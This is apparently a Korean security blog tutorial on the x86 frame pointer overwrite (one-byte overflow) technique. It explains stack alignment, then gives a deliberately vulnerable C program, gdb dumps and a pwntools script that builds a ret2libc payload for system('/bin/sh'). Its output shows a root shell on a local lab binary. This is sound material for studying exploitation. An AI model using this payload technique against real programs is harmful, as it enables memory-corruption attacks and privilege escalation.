---
title: Frame Pointer Overwrite - x86
author: Beomsu Lee
category: [Exploitation, Stack]
tags: [exploitation, stack, frame pointer overwrite]
math: true
mermaid: true
---

## Description

frame poineter를 1byte 덮어써 코드의 흐름을 변경하는 기법이다. One-byte Overflow 라고도 한다.

## Stack alignment

x86-64 ABI는 16Byte stack alignment가 필요하다. ABI와 호환되지 않는 환경에서 스택 공간을 제한해서 사용하기 위함이다.

### Stack alignment at 4-byte boundary

```
0x080485c7 <+0>:  push   ebp
0x080485c8 <+1>:  mov    ebp,esp
~
0x080485ea <+35>: leave 
0x080485eb <+36>: ret
```

### Stack alignment at 16-byte boundary

1. main() 함수가 시작되는 부분에서 이전 함수에서 사용하던 Frame Pointer를 Stack에 저장하기 전에 Stack alignment 수행
2. main() 함수가 종료되는 부분에서 leave 명령 실행 전, ebp 레지스터에 저장된 주소에 0x4를 뺀 주소 값을 esp 레지스터에 저장
3. Stack alignment 코드가 적용되면 ret 코드가 실행되기 전에 "lea esp,\[ecx-0x4\]" 명령에 의해 esp 레지스터가 변경됨
4. ecx 레지스터의 값은 leave 코드가 실행되기전에 ebp 레지스터를 이용해 값을 저장하기 때문에 esp 레지스터의 값을 변경할 수 있음

esp 레지스터에 저장된 값에 0x4를 더한 주소를 ecx에 저장한다.

```
0x080485d3 <+0>: lea    ecx,[esp+0x4]
```

esp 레지스터에 저장된 값과 0xfffffff0을 AND 연산한 값을 저장(0xffffd59c & 0xfffffff0 = 0xffffd590) 이로 인해 Stack 주소가 16byte 경계에 맞춰진다.

```
0x080485d7 <+4>: and    esp,0xfffffff0
```

stack에 \[ecx-0x4\]주소에 저장된 값 저장한다. (main() 함수가 종료되고 되돌아갈 Return address)

```
0x080485da <+7>: push   DWORD PTR [ecx-0x4]
```

ESP 레지스터의 값이 leave 코드에 의해 변경되는 것이 아니라 lea esp,\[ecx-0x4\] 코드에 의해 변경된다.

## Proof of Concept

```c
// gcc -m32 -fno-stack-protector -o fpo fpo.c -ldl
#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <dlfcn.h>
#include <stdlib.h>
  
void vuln(){
    char buf[50];
    printf("buf[50] address : %p\n",buf);
    void (*printf_addr)() = dlsym(RTLD_NEXT, "printf");
    printf("Printf() address : %p\n",printf_addr);
    read(0, buf, 63);
}
  
void main(int argc, char *argv[]){
    if(argc<2){
        printf("argv error\n");
        exit(0);
    }
    vuln();
}
```

63byte를 입력받으면 ebp의 마지막 1byte가 overflow 된다.

```
gdb-peda$ x/24wx 0xbfa07cfa(&buf)
0xbfa07cfa: 0x41414141  0x42424242  0x43434343  0x44444444
0xbfa07d0a: 0x45454545  0x46464646  0x47474747  0x48484848
```

&buf+4(0xbfa07cfe)의 마지막 byte(0xfe)를 EBP의 마지막 바이트에 삽입한다.

```
gdb-peda$ x/24x $ebp
0xbfa07d02: 0x43434343  0x44444444  0x45454545  0x46464646
0xbfa07d12: 0x47474747  0x48484848  0x80ecb70a  0x0002b7d2
```

mov ecx,DWORD PTR \[ebp-0x4\] 명령으로 0xbfa07cfe가 ecx 레지스터에 저장된다.

```
gdb-peda$ x/24x $ecx-0x4
0x4242423e: Cannot access memory at address 0x4242423e
```

## Exploit Code

```python
# Exploit Code
from pwn import *
p=process(['./fpo','AA'])

tmp = p.recvline().split(' ')[3]
printf = int(p.recvline().split(' ')[3],16)
buf = int(tmp,16)

print('buf    :%s'%hex(buf))
print('printf :%s'%hex(printf))

onebyte = int(tmp[8:11],16)
print('onebyte :%s'%hex(onebyte))

buf += 0x8
onebyte += 0x4

libBase = printf - 0x4a670
system = libBase + 0x3bda0
binsh = libBase + 0x15ca0b
exit = libBase + 0x2f9d0

print('libBase :%s'%hex(libBase))
print('system :%s'%hex(system))
print('/bin/sh :%s'%hex(binsh))
print('exit :%s'%hex(exit))

exploit = p32(buf)
exploit += p32(system)
exploit += p32(exit)
exploit += p32(binsh)
exploit += "\x90"*(62-len(exploit))
exploit += p32(onebyte)

p.sendline(exploit)

p.interactive()
```

## Exploit

```bash
root@bs-virtual-machine:~/fpo# python expliot.py 
[!] Pwntools does not support 32-bit Python.  Use a 64-bit release.
[+] Starting local process './fpo': pid 3107
buf    :0xbfb2019a
printf :0xb7e4b670
onebyte :0x9a
libBase :0xb7e01000
system :0xb7e3cda0
/bin/sh :0xb7f5da0b
exit :0xb7e309d0
[*] Switching to interactive mode
$ id
uid=0(root) gid=0(root) groups=0(root)
```

## References
- [04.Frame faking(Fake ebp)](https://www.lazenca.net/pages/viewpage.action?pageId=12189944)